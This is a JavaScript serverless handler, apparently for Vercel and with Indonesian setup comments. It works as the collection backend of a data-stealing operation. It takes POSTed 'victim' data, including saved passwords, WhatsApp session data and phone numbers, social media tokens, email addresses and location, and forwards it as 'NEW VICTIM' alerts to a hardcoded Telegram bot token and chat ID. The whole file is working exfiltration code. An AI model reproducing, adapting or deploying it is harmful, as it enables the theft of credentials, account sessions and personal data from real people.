export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const data = req.body;
        const victimId = `v_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`;
        
        const victimData = {
            victimId: victimId,
            timestamp: new Date().toISOString(),
            server_ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
            user_agent: req.headers['user-agent'],
            data: data
        };
        
        // ============ TELEGRAM CONFIG ============
        // GANTI DENGAN TOKEN DAN CHAT ID ANDA
        const telegramToken = '8600209654:AAGcQGkrs7ilTXWzfz7WTuF8Q3hofXAy72c';
        const chatId = '8632925211';
        
        if (telegramToken !== 'YOUR_BOT_TOKEN') {
            let message = `🔴 *NEW VICTIM - VERCEL DEPLOY*\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `🆔 *ID:* ${victimId}\n`;
            message += `🕐 *Time:* ${new Date().toLocaleString('id-ID')}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `📱 *DEVICE INFO*\n`;
            message += `• Platform: ${data.platform || 'N/A'}\n`;
            message += `• Browser: ${(data.userAgent || 'N/A').substring(0, 80)}\n`;
            message += `• Screen: ${data.screen?.width || 'N/A'}x${data.screen?.height || 'N/A'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `🌍 *LOCATION*\n`;
            message += `• IP: ${data.ip || victimData.server_ip}\n`;
            message += `• City: ${data.location?.city || 'N/A'}\n`;
            message += `• Country: ${data.location?.country || 'N/A'}\n`;
            message += `• ISP: ${data.location?.isp || 'N/A'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            
            if (data.savedPasswords && data.savedPasswords.length > 0) {
                message += `🔑 *SAVED PASSWORDS*\n`;
                data.savedPasswords.forEach((pwd, idx) => {
                    message += `• ${idx+1}. Email: ${pwd.email || 'N/A'}\n`;
                    message += `   Pass: ${pwd.password || 'N/A'}\n`;
                });
                message += `━━━━━━━━━━━━━━━━━━━━\n`;
            }
            
            if (data.whatsappData && Object.keys(data.whatsappData).length > 0) {
                message += `📱 *WHATSAPP SESSION*\n`;
                message += `• Data: ${JSON.stringify(data.whatsappData).substring(0, 100)}...\n`;
                if (data.whatsappNumber) {
                    message += `• Phone: ${data.whatsappNumber}\n`;
                }
                message += `━━━━━━━━━━━━━━━━━━━━\n`;
            }
            
            if (data.socialMediaTokens && Object.keys(data.socialMediaTokens).length > 0) {
                message += `📸 *SOCIAL MEDIA*\n`;
                Object.keys(data.socialMediaTokens).forEach(platform => {
                    message += `• ${platform}: token captured\n`;
                });
                message += `━━━━━━━━━━━━━━━━━━━━\n`;
            }
            
            if (data.emailData?.emails && data.emailData.emails.length > 0) {
                message += `📧 *EMAILS*\n`;
                message += `• ${data.emailData.emails.slice(0, 5).join(', ')}\n`;
                message += `━━━━━━━━━━━━━━━━━━━━\n`;
            }
            
            message += `📦 *FULL DATA:* \`/logs/${victimId}.json\``;
            
            const tgUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
            await fetch(tgUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        console.log(`[${victimId}] Data collected:`, {
            ip: data.ip,
            savedPasswords: data.savedPasswords?.length || 0,
            whatsapp: data.whatsappData ? 'YES' : 'NO'
        });
        
        return res.status(200).json({
            status: 'success',
            id: victimId,
            message: 'Data collected successfully'
        });
        
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ 
            status: 'error', 
            message: error.message 
        });
    }
}